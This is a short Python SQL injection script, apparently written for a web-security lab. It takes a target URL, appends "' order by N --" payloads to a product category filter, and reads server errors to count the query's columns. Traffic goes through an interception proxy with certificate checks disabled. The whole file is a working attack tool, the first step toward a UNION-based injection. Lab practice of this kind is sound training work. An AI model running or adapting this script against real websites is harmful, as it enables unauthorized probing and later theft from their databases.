import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://10.0.2.5:8080', 'https' : 'http://10.0.2.5:8080'}

def exploit_sqli(url):
	uri = '/filter?category=Gifts'
	for i in range(1,50):
		payload = "' order by %s --" % i
		r = requests.get(url + uri + payload, verify = False, proxies = proxies)
		if "Internal Server Error" in r.text:
			return i-1
	return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[-] Usage: %s <url>' % sys.argv[0])
		print('[-] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)

	num_col = exploit_sqli(url)
	if num_col:
		print('[+] SQLi Successful')
		print('[+] Numger of Columns:', str(num_col))
	else:
		print('[-] SQLi Unsuccessful')
